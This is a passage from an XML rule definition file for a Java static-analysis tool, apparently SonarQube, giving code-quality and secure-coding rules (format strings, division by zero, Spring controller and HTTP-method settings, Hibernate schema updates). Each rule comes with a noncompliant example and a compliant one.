            &amp;lt;bean id=&quot;singleCF&quot; class=&quot;org.springframework.jms.connection.SingleConnectionFactory&quot;&amp;gt;
            &amp;lt;constructor-arg ref=&quot;dummyConnectionFactory&quot; /&amp;gt;
            &amp;lt;property name=&quot;reconnectOnException&quot;&amp;gt;&amp;lt;value&amp;gt;true&amp;lt;/value&amp;gt;&amp;lt;/property&amp;gt;
            &amp;lt;/bean&amp;gt;
            &lt;/pre&gt;
        </description>
        <tag>spring</tag>
    </rule>

    <rule key='S3439' priority='MAJOR'>
        <configKey>S3439</configKey>
        <name>&quot;DefaultMessageListenerContainer&quot; instances should not drop messages during restarts</name>
        <description>
            &lt;p&gt;&lt;code&gt;DefaultMessageListenerContainer&lt;/code&gt; is implemented as a JMS poller. While the
            Spring container is shutting itself down, as each
            in-progress JMS &lt;code&gt;Consumer.receive()&lt;/code&gt; call completes, any non-&lt;code&gt;null&lt;/code&gt;
            return value will be a JMS message that the DMLC will
            &lt;em&gt;discard&lt;/em&gt; due to the shutdown in progress. That will result in the received message never
            being processed. &lt;/p&gt;
            &lt;p&gt;To prevent message loss during restart operations, set &lt;code&gt;acceptMessagesWhileStopping&lt;/code&gt;
            to &lt;code&gt;true&lt;/code&gt; so that such messages will be
            processed before shut down.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;bean id=&quot;listenerContainer&quot; class=&quot;org.springframework.jms.listener.DefaultMessageListenerContainer&quot;&amp;gt;
            &amp;lt;!-- Noncompliant --&amp;gt;
            &amp;lt;property name=&quot;connectionFactory&quot; ref=&quot;connFactory&quot; /&amp;gt;
            &amp;lt;property name=&quot;destination&quot; ref=&quot;dest&quot; /&amp;gt;
            &amp;lt;property name=&quot;messageListener&quot; ref=&quot;serviceAdapter&quot; /&amp;gt;
            &amp;lt;property name=&quot;autoStartup&quot; value=&quot;true&quot; /&amp;gt;
            &amp;lt;property name=&quot;concurrentConsumers&quot; value=&quot;10&quot; /&amp;gt;
            &amp;lt;property name=&quot;maxConcurrentConsumers&quot; value=&quot;10&quot; /&amp;gt;
            &amp;lt;property name=&quot;clientId&quot; value=&quot;myClientID&quot; /&amp;gt;
            &amp;lt;/bean&amp;gt;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;bean id=&quot;listenerContainer&quot; class=&quot;org.springframework.jms.listener.DefaultMessageListenerContainer&quot;&amp;gt;
            &amp;lt;property name=&quot;connectionFactory&quot; ref=&quot;connFactory&quot; /&amp;gt;
            &amp;lt;property name=&quot;destination&quot; ref=&quot;dest&quot; /&amp;gt;
            &amp;lt;property name=&quot;messageListener&quot; ref=&quot;serviceAdapter&quot; /&amp;gt;
            &amp;lt;property name=&quot;autoStartup&quot; value=&quot;true&quot; /&amp;gt;
            &amp;lt;property name=&quot;concurrentConsumers&quot; value=&quot;10&quot; /&amp;gt;
            &amp;lt;property name=&quot;maxConcurrentConsumers&quot; value=&quot;10&quot; /&amp;gt;
            &amp;lt;property name=&quot;clientId&quot; value=&quot;myClientID&quot; /&amp;gt;
            &amp;lt;property name=&quot;acceptMessagesWhileStopping&quot; value=&quot;true&quot; /&amp;gt;
            &amp;lt;/bean&amp;gt;
            &lt;/pre&gt;
        </description>
        <tag>spring</tag>
    </rule>

    <rule key='S3457' priority='MAJOR'>
        <configKey>S3457</configKey>
        <name>Printf-style format strings should be used correctly</name>
        <description>
            &lt;p&gt;Because &lt;code&gt;printf&lt;/code&gt;-style format strings are interpreted at runtime, rather
            than validated by the compiler, they can contain errors that
            result in the wrong strings being created. This rule statically validates the correlation of &lt;code&gt;printf&lt;/code&gt;-style
            format strings to their
            arguments when calling the &lt;code&gt;format(...)&lt;/code&gt; methods of &lt;code&gt;java.util.Formatter&lt;/code&gt;,
            &lt;code&gt;java.lang.String&lt;/code&gt;,
            &lt;code&gt;java.io.PrintStream&lt;/code&gt;, &lt;code&gt;MessageFormat&lt;/code&gt;, and &lt;code&gt;java.io.PrintWriter&lt;/code&gt;
            classes and the &lt;code&gt;printf(...)&lt;/code&gt; methods of
            &lt;code&gt;java.io.PrintStream&lt;/code&gt; or &lt;code&gt;java.io.PrintWriter&lt;/code&gt; classes. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            String.format(&quot;First {0} and then {1}&quot;, &quot;foo&quot;, &quot;bar&quot;); //Noncompliant. Looks
            like there is a confusion with the use of {{java.text.MessageFormat}}, parameters &quot;foo&quot; and &quot;bar&quot;
            will be simply ignored here
            String.format(&quot;Display %3$d and then %d&quot;, 1, 2, 3); //Noncompliant; the second argument '2' is
            unused
            String.format(&quot;Too many arguments %d and %d&quot;, 1, 2, 3); //Noncompliant; the third argument '3' is
            unused
            String.format(&quot;First Line\n&quot;); //Noncompliant; %n should be used in place of \n to produce the
            platform-specific line separator
            String.format(&quot;Is myObject null ? %b&quot;, myObject); //Noncompliant; when a non-boolean argument is
            formatted with %b, it prints true for any nonnull value, and false for null. Even if intended, this is
            misleading. It's better to directly inject the boolean value (myObject == null in this case)
            String.format(&quot;value is &quot; + value); // Noncompliant
            String s = String.format(&quot;string without arguments&quot;); // Noncompliant

            MessageFormat.format(&quot;Result '{0}'.&quot;, value); // Noncompliant; String contains no format
            specifiers. (quote are discarding format specifiers)
            MessageFormat.format(&quot;Result {0}.&quot;, value, value); // Noncompliant; 2nd argument is not used
            MessageFormat.format(&quot;Result {0}.&quot;, myObject.toString()); // Noncompliant; no need to call
            toString() on objects

            java.util.Logger logger;
            logger.log(java.util.logging.Level.SEVERE, &quot;Result {0}.&quot;, myObject.toString()); // Noncompliant;
            no need to call toString() on objects
            logger.log(java.util.logging.Level.SEVERE, &quot;Result.&quot;, new Exception()); // compliant, parameter is
            an exception
            logger.log(java.util.logging.Level.SEVERE, &quot;Result '{0}'&quot;, 14); // Noncompliant - String contains
            no format specifiers.
            logger.log(java.util.logging.Level.SEVERE, &quot;Result &quot; + param, exception); // Noncompliant; Lambda
            should be used to differ string concatenation.

            org.slf4j.Logger slf4jLog;
            org.slf4j.Marker marker;

            slf4jLog.debug(marker, &quot;message {}&quot;);
            slf4jLog.debug(marker, &quot;message&quot;, 1); // Noncompliant - String contains no format specifiers.

            org.apache.logging.log4j.Logger log4jLog;
            log4jLog.debug(&quot;message&quot;, 1); // Noncompliant - String contains no format specifiers.
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            String.format(&quot;First %s and then %s&quot;, &quot;foo&quot;, &quot;bar&quot;);
            String.format(&quot;Display %2$d and then %d&quot;, 1, 3);
            String.format(&quot;Too many arguments %d %d&quot;, 1, 2);
            String.format(&quot;First Line%n&quot;);
            String.format(&quot;Is myObject null ? %b&quot;, myObject == null);
            String.format(&quot;value is %d&quot;, value);
            String s = &quot;string without arguments&quot;;

            MessageFormat.format(&quot;Result {0}.&quot;, value);
            MessageFormat.format(&quot;Result '{0}' = {0}&quot;, value);
            MessageFormat.format(&quot;Result {0}.&quot;, myObject);

            java.util.Logger logger;
            logger.log(java.util.logging.Level.SEVERE, &quot;Result {0}.&quot;, myObject);
            logger.log(java.util.logging.Level.SEVERE, &quot;Result {0}'&quot;, 14);
            logger.log(java.util.logging.Level.SEVERE, exception, () -&amp;gt; &quot;Result &quot; + param);

            org.slf4j.Logger slf4jLog;
            org.slf4j.Marker marker;

            slf4jLog.debug(marker, &quot;message {}&quot;);
            slf4jLog.debug(marker, &quot;message {}&quot;, 1);

            org.apache.logging.log4j.Logger log4jLog;
            log4jLog.debug(&quot;message {}&quot;, 1);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/J9YxBQ&quot;&gt;CERT, FIO47-C.&lt;/a&gt; -
            Use valid format strings &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>confusing</tag>
    </rule>

    <rule key='S3516' priority='BLOCKER'>
        <configKey>S3516</configKey>
        <name>Methods returns should not be invariant</name>
        <description>
            &lt;p&gt;When a method is designed to return an invariant value, it may be poor design, but it shouldn't
            adversely affect the outcome of your program.
            However, when it happens on all paths through the logic, it is surely a bug.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a method contains several &lt;code&gt;return&lt;/code&gt; statements
            that all return the same value.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            int foo(int a) {
            int b = 12;
            if (a == 1) {
            return b;
            }
            return b; // Noncompliant
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S3518' priority='CRITICAL'>
        <configKey>S3518</configKey>
        <name>Zero should not be a possible denominator</name>
        <description>
            &lt;p&gt;If the denominator to a division or modulo operation is zero it would result in a fatal error.&lt;/p&gt;
            &lt;p&gt;When working with &lt;code&gt;double&lt;/code&gt; or &lt;code&gt;float&lt;/code&gt;, no fatal error
            will be raised, but it will lead to unusual result and should be
            avoided anyway.&lt;/p&gt;
            &lt;p&gt;This rule supports primitive &lt;code&gt;int&lt;/code&gt;, &lt;code&gt;long&lt;/code&gt;, &lt;code&gt;double&lt;/code&gt;,
            &lt;code&gt;float&lt;/code&gt; as well as &lt;code&gt;BigDecimal&lt;/code&gt; and
            &lt;code&gt;BigInteger&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            void test_divide() {
            int z = 0;
            if (unknown()) {
            // ..
            z = 3;
            } else {
            // ..
            }
            z = 1 / z; // Noncompliant, possible division by zero
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            void test_divide() {
            int z = 0;
            if (unknown()) {
            // ..
            z = 3;
            } else {
            // ..
            z = 1;
            }
            z = 1 / z;
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/369.html&quot;&gt;MITRE, CWE-369&lt;/a&gt;
            - Divide by zero &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/CTZGBQ&quot;&gt;CERT, NUM02-J.&lt;/a&gt; -
            Ensure that division and remainder operations do not result in
            divide-by-zero errors &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/ftYxBQ&quot;&gt;CERT, INT33-C.&lt;/a&gt; -
            Ensure that division and remainder operations do not result in
            divide-by-zero errors &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>denial-of-service</tag>
    </rule>

    <rule key='S3551' priority='MAJOR'>
        <configKey>S3551</configKey>
        <name>Overrides should match their parent class methods in synchronization</name>
        <description>
            &lt;p&gt;When &lt;code&gt;@Overrides&lt;/code&gt; of &lt;code&gt;synchronized&lt;/code&gt; methods are not
            themselves &lt;code&gt;synchronized&lt;/code&gt;, the result can be improper
            synchronization as callers rely on the thread-safety promised by the parent class.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Parent {

            synchronized void foo() {
            //...
            }
            }

            public class Child extends Parent {

            @Override
            public void foo () { // Noncompliant
            // ...
            super.foo();
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Parent {

            synchronized void foo() {
            //...
            }
            }

            public class Child extends Parent {

            @Override
            synchronized void foo () {
            // ...
            super.foo();
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/gzdGBQ&quot;&gt;CERT, TSM00-J&lt;/a&gt; -
            Do not override thread-safe methods with methods that are not
            thread-safe &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S3577' priority='MINOR'>
        <configKey>S3577</configKey>
        <name>Test classes should comply with a naming convention</name>
        <description>
            &lt;p&gt;Shared naming conventions allow teams to collaborate efficiently. This rule raises an issue when a
            test class name does not match the provided
            regular expression.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;p&gt;With the default value: &lt;code&gt;^((Test|IT)[a-zA-Z0-9_]+|[A-Z][a-zA-Z0-9_]*(Test|Tests|TestCase|IT|ITCase))$&lt;/code&gt;&lt;/p&gt;
            &lt;pre&gt;
            class Foo { // Noncompliant
            @Test
            void check() { }
            }

            class Bar { // Noncompliant
            @Nested
            class PositiveCase {
            @Test
            void check() { }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class FooTest {
            @Test
            void check() { }
            }

            class BarIT {
            @Nested
            class PositiveCase {
            @Test
            void check() { }
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
        <tag>tests</tag>
        <param>
            <key>format</key>
            <htmlDesc>Regular expression against which test class names are checked.</htmlDesc>
            <defaultValue>^((Test|IT)[a-zA-Z0-9_]+|[A-Z][a-zA-Z0-9_]*(Test|Tests|TestCase|IT|ITCase))$</defaultValue>
            <type>STRING</type>
        </param>
    </rule>

    <rule key='S3599' priority='MINOR'>
        <configKey>S3599</configKey>
        <name>Double Brace Initialization should not be used</name>
        <description>
            &lt;p&gt;Because Double Brace Initialization (DBI) creates an anonymous class with a reference to the
            instance of the owning object, its use can lead to
            memory leaks if the anonymous inner class is returned and held by other objects. Even when there's no leak,
            DBI is so obscure that it's bound to
            confuse most maintainers. &lt;/p&gt;
            &lt;p&gt;For collections, use &lt;code&gt;Arrays.asList&lt;/code&gt; instead, or explicitly add each item
            directly to the collection.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Map source = new HashMap(){{ // Noncompliant
            put(&quot;firstName&quot;, &quot;John&quot;);
            put(&quot;lastName&quot;, &quot;Smith&quot;);
            }};
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Map source = new HashMap();
            // ...
            source.put(&quot;firstName&quot;, &quot;John&quot;);
            source.put(&quot;lastName&quot;, &quot;Smith&quot;);
            // ...
            &lt;/pre&gt;
        </description>
        <tag>leak</tag>
    </rule>

    <rule key='S3626' priority='MINOR'>
        <configKey>S3626</configKey>
        <name>Jump statements should not be redundant</name>
        <description>
            &lt;p&gt;Jump statements such as &lt;code&gt;return&lt;/code&gt; and &lt;code&gt;continue&lt;/code&gt; let
            you change the default flow of program execution, but jump statements
            that direct the control flow to the original direction are just a waste of keystrokes.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void foo() {
            while (condition1) {
            if (condition2) {
            continue; // Noncompliant
            } else {
            doTheThing();
            }
            }
            return; // Noncompliant; this is a void method
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void foo() {
            while (condition1) {
            if (!condition2) {
            doTheThing();
            }
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
        <tag>redundant</tag>
    </rule>

    <rule key='S3631' priority='MAJOR'>
        <configKey>S3631</configKey>
        <name>&quot;Arrays.stream&quot; should be used for primitive arrays</name>
        <description>
            &lt;p&gt;For arrays of objects, &lt;code&gt;Arrays.asList(T ... a).stream()&lt;/code&gt; and &lt;code&gt;Arrays.stream(array)&lt;/code&gt;
            are basically equivalent in terms of
            performance. However, for arrays of primitives, using &lt;code&gt;Arrays.asList&lt;/code&gt; will force the
            construction of a list of boxed types, and then use
            &lt;em&gt;that&lt;/em&gt; list as a stream. On the other hand, &lt;code&gt;Arrays.stream&lt;/code&gt; uses
            the appropriate primitive stream type (&lt;code&gt;IntStream&lt;/code&gt;,
            &lt;code&gt;LongStream&lt;/code&gt;, &lt;code&gt;DoubleStream&lt;/code&gt;) when applicable, with much
            better performance.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Arrays.asList(&quot;a1&quot;, &quot;a2&quot;, &quot;b1&quot;, &quot;c2&quot;, &quot;c1&quot;).stream()
            .filter(...)
            .forEach(...);

            Arrays.asList(1, 2, 3, 4).stream() // Noncompliant
            .filter(...)
            .forEach(...);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Arrays.asList(&quot;a1&quot;, &quot;a2&quot;, &quot;b1&quot;, &quot;c2&quot;, &quot;c1&quot;).stream()
            .filter(...)
            .forEach(...);

            int[] intArray = new int[]{1, 2, 3, 4};
            Arrays.stream(intArray)
            .filter(...)
            .forEach(...);
            &lt;/pre&gt;
        </description>
        <tag>performance</tag>
    </rule>

    <rule key='S3655' priority='MAJOR'>
        <configKey>S3655</configKey>
        <name>Optional value should only be accessed after calling isPresent()</name>
        <description>
            &lt;p&gt;&lt;code&gt;Optional&lt;/code&gt; value can hold either a value or not. The value held in the &lt;code&gt;Optional&lt;/code&gt;
            can be accessed using the
            &lt;code&gt;get()&lt;/code&gt; method, but it will throw a &lt;/p&gt;
            &lt;p&gt;&lt;code&gt;NoSuchElementException&lt;/code&gt; if there is no value present. To avoid the
            exception, calling the &lt;code&gt;isPresent()&lt;/code&gt; or &lt;code&gt;!
            isEmpty()&lt;/code&gt; method should always be done before any call to &lt;code&gt;get()&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;Alternatively, note that other methods such as &lt;code&gt;orElse(...)&lt;/code&gt;, &lt;code&gt;orElseGet(...)&lt;/code&gt;
            or &lt;code&gt;orElseThrow(...)&lt;/code&gt; can be used
            to specify what to do with an empty &lt;code&gt;Optional&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Optional&amp;lt;String&amp;gt; value = this.getOptionalValue();

            // ...

            String stringValue = value.get(); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Optional&amp;lt;String&amp;gt; value = this.getOptionalValue();

            // ...

            if (value.isPresent()) {
            String stringValue = value.get();
            }
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            Optional&amp;lt;String&amp;gt; value = this.getOptionalValue();

            // ...

            String stringValue = value.orElse(&quot;default&quot;);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/476.html&quot;&gt;MITRE, CWE-476&lt;/a&gt;
            - NULL Pointer Dereference &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <securityStandards>
            <cwe>476</cwe>
        </securityStandards>
    </rule>

    <rule key='S3740' priority='MAJOR'>
        <configKey>S3740</configKey>
        <name>Raw types should not be used</name>
        <description>
            &lt;p&gt;Generic types shouldn't be used raw (without type parameters) in variable declarations or return
            values. Doing so bypasses generic type checking,
            and defers the catch of unsafe code to runtime.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            List myList; // Noncompliant
            Set mySet; // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            List&amp;lt;String&amp;gt; myList;
            Set&amp;lt;? extends Number&amp;gt; mySet;
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S3751' priority='MAJOR'>
        <configKey>S3751</configKey>
        <name>&quot;@RequestMapping&quot; methods should be &quot;public&quot;</name>
        <description>
            &lt;p&gt;A method with a &lt;code&gt;@RequestMapping&lt;/code&gt; annotation part of a class annotated with
            &lt;code&gt;@Controller&lt;/code&gt; (directly or indirectly through a
            meta annotation - &lt;code&gt;@RestController&lt;/code&gt; from Spring Boot is a good example) will be
            called to handle matching web requests. That will happen
            even if the method is &lt;code&gt;private&lt;/code&gt;, because Spring invokes such methods via reflection,
            without checking visibility. &lt;/p&gt;
            &lt;p&gt;So marking a sensitive method &lt;code&gt;private&lt;/code&gt; may seem like a good way to control
            how such code is called. Unfortunately, not all Spring
            frameworks ignore visibility in this way. For instance, if you've tried to control web access to your
            sensitive, &lt;code&gt;private&lt;/code&gt;,
            &lt;code&gt;@RequestMapping&lt;/code&gt; method by marking it &lt;code&gt;@Secured&lt;/code&gt; ... it will
            still be called, whether or not the user is authorized to access
            it. That's because AOP proxies are not applied to non-public methods.&lt;/p&gt;
            &lt;p&gt;In addition to &lt;code&gt;@RequestMapping&lt;/code&gt;, this rule also considers the annotations
            introduced in Spring Framework 4.3: &lt;code&gt;@GetMapping&lt;/code&gt;,
            &lt;code&gt;@PostMapping&lt;/code&gt;, &lt;code&gt;@PutMapping&lt;/code&gt;, &lt;code&gt;@DeleteMapping&lt;/code&gt;,
            &lt;code&gt;@PatchMapping&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @RequestMapping(&quot;/greet&quot;, method = GET)
            private String greet(String greetee) { // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @RequestMapping(&quot;/greet&quot;, method = GET)
            public String greet(String greetee) {
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration&quot;&gt;OWASP
            Top 10 2017 Category A6&lt;/a&gt; - Security
            Misconfiguration &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>owasp-a6</tag>
        <tag>spring</tag>
        <securityStandards>
            <OWASP>A6</OWASP>
        </securityStandards>
    </rule>

    <rule key='S3752' priority='MINOR'>
        <configKey>S3752</configKey>
        <name>Allowing both safe and unsafe HTTP methods is security-sensitive</name>
        <description>
            &lt;p&gt;An HTTP method is safe when used to perform a read-only operation, such as retrieving information.
            In contrast, an unsafe HTTP method is used to
            change the state of an application, for instance to update a user's profile on a web application.&lt;/p&gt;
            &lt;p&gt;Common safe HTTP methods are GET, HEAD, or OPTIONS.&lt;/p&gt;
            &lt;p&gt;Common unsafe HTTP methods are POST, PUT and DELETE.&lt;/p&gt;
            &lt;p&gt;Allowing both safe and unsafe HTTP methods to perform a specific operation on a web application
            could impact its security, for example CSRF
            protections are most of the time only protecting operations performed by unsafe HTTP methods.&lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; HTTP methods are not defined at all for a route/controller of the application. &lt;/li&gt;
            &lt;li&gt; Safe HTTP methods are defined and used for a route/controller that can change the state of an
            application. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to any of those questions.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;For all the routes/controllers of an application, the authorized HTTP methods should be explicitly
            defined and safe HTTP methods should only be
            used to perform read-only operations.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @RequestMapping(&quot;/delete_user&quot;) // Sensitive: by default all HTTP methods are allowed
            public String delete1(String username) {
            // state of the application will be changed here
            }

            @RequestMapping(path = &quot;/delete_user&quot;, method = {RequestMethod.GET, RequestMethod.POST}) //
            Sensitive: both safe and unsafe methods are allowed
            String delete2(@RequestParam(&quot;id&quot;) String id) {
            // state of the application will be changed here
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @RequestMapping(&quot;/delete_user&quot;, method = RequestMethod.POST) // Compliant
            public String delete1(String username) {
            // state of the application will be changed here
            }

            @RequestMapping(path = &quot;/delete_user&quot;, method = RequestMethod.POST) // Compliant
            String delete2(@RequestParam(&quot;id&quot;) String id) {
            // state of the application will be changed here
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A5-Broken_Access_Control&quot;&gt;OWASP
            Top 10 2017 Category A5&lt;/a&gt; -
            Broken Access Control &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/352.html&quot;&gt;MITRE, CWE-352&lt;/a&gt;
            - Cross-Site Request Forgery (CSRF) &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://owasp.org/www-community/attacks/csrf&quot;&gt;OWASP: Cross-Site Request
            Forgery&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.sans.org/top25-software-errors/#cat1&quot;&gt;SANS Top 25&lt;/a&gt;
            - Insecure Interaction Between Components &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-use-proper-verbs&quot;&gt;Spring
            Security Official
            Documentation: Use proper HTTP verbs (CSRF protection)&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a5</tag>
        <tag>sans-top25-insecure</tag>
        <tag>spring</tag>
        <securityStandards>
            <cwe>352</cwe>
            <OWASP>A5</OWASP>
        </securityStandards>
    </rule>

    <rule key='S3753' priority='BLOCKER'>
        <configKey>S3753</configKey>
        <name>&quot;@Controller&quot; classes that use &quot;@SessionAttributes&quot; must call &quot;setComplete&quot;
            on their &quot;SessionStatus&quot; objects
        </name>
        <description>
            &lt;p&gt;A Spring &lt;code&gt;@Controller&lt;/code&gt; that uses &lt;code&gt;@SessionAttributes&lt;/code&gt;
            is designed to handle a stateful / multi-post form. Such
            &lt;code&gt;@Controller&lt;/code&gt;s use the specified &lt;code&gt;@SessionAttributes&lt;/code&gt; to store
            data on the server between requests. That data should be cleaned
            up when the session is over, but unless &lt;code&gt;setComplete()&lt;/code&gt; is called on the &lt;code&gt;SessionStatus&lt;/code&gt;
            object from a
            &lt;code&gt;@RequestMapping&lt;/code&gt; method, neither Spring nor the JVM will know it's time to do that.
            Note that the &lt;code&gt;SessionStatus&lt;/code&gt; object must
            be passed to that method as a parameter.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @Controller
            @SessionAttributes(&quot;hello&quot;) // Noncompliant; this doesn't get cleaned up
            public class HelloWorld {

            @RequestMapping(&quot;/greet&quot;, method = GET)
            public String greet(String greetee) {

            return &quot;Hello &quot; + greetee;
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @Controller
            @SessionAttributes(&quot;hello&quot;)
            public class HelloWorld {

            @RequestMapping(&quot;/greet&quot;, method = GET)
            public String greet(String greetee) {

            return &quot;Hello &quot; + greetee;
            }

            @RequestMapping(&quot;/goodbye&quot;, method = POST)
            public String goodbye(SessionStatus status) {
            //...
            status.setComplete();
            }

            }
            &lt;/pre&gt;
        </description>
        <tag>spring</tag>
    </rule>

    <rule key='S3776' priority='CRITICAL'>
        <configKey>S3776</configKey>
        <name>Cognitive Complexity of methods should not be too high</name>
        <description>
            &lt;p&gt;Cognitive Complexity is a measure of how hard the control flow of a method is to understand.
            Methods with high Cognitive Complexity will be
            difficult to maintain.&lt;/p&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://redirect.sonarsource.com/doc/cognitive-complexity.html&quot;&gt;Cognitive
            Complexity&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>brain-overload</tag>
        <param>
            <key>Threshold</key>
            <htmlDesc>The maximum authorized complexity.</htmlDesc>
            <defaultValue>15</defaultValue>
            <type>INTEGER</type>
        </param>
    </rule>

    <rule key='S3822' priority='CRITICAL'>
        <configKey>S3822</configKey>
        <name>Hibernate should not update database schemas</name>
        <description>
            &lt;p&gt;The use of any value but &lt;code&gt;&quot;validate&quot;&lt;/code&gt; for &lt;code&gt;hibernate.hbm2ddl.auto&lt;/code&gt;
            may cause the database schema used by your application to
            be changed, dropped, or cleaned of all data. In short, the use of this property is risky, and should only be
            used in production with the
            &lt;code&gt;&quot;validate&quot;&lt;/code&gt; option, if it is used at all.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;session-factory&amp;gt;
            &amp;lt;property name=&quot;hibernate.hbm2ddl.auto&quot;&amp;gt;update&amp;lt;/property&amp;gt; &amp;lt;!--
            Noncompliant --&amp;gt;
            &amp;lt;/session-factory&amp;gt;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            &amp;lt;session-factory&amp;gt;
            &amp;lt;property name=&quot;hibernate.hbm2ddl.auto&quot;&amp;gt;validate&amp;lt;/property&amp;gt; &amp;lt;!--
            Compliant --&amp;gt;
            &amp;lt;/session-factory&amp;gt;
            &lt;/pre&gt;
            &lt;p&gt;or&lt;/p&gt;
            &lt;pre&gt;
            &amp;lt;session-factory&amp;gt;
